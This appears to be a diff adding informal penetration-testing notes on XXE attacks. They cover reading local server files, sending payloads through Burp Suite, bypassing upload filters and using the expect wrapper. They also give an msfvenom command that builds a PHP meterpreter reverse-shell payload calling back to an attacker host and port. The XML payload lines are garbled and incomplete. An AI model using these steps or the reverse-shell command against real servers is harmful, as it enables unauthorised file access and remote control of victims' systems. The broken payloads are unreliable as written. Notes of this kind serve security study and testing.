@@ -1,1 +1,22 @@
+XXE
+we canot use whitespaces in this attack so either we can use the $IFS command instead of a space
+THis is used to read local files on server
+
+Either place this payload in burp suite content portion if the request is dealing with xml or we can also upload a xml file with this payload and get to execute this. We may need to bypass upload restrictions because xml files are not generally allowed. The variable names starting & sign in website indicates xml and xml parsing so we can perform a xxe attack
+
+<!- - ?xml version="1.0" ?- ->
+]> &ent;
+
+we can also try different payloads
+
+WE can also use the above command and replace file with expect command
+
+Remote xxe
+we can use this to upload a shell to server
+instead of .php shell we should make .txt shell with msfvenom because these attacks sometimes run the php shell on our machine
+
+    msfvenom -p php/meterpreter/reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f raw > shell.txt
+
+<!- - ?xml version="1.0" ?- ->
+]> &ent;
 
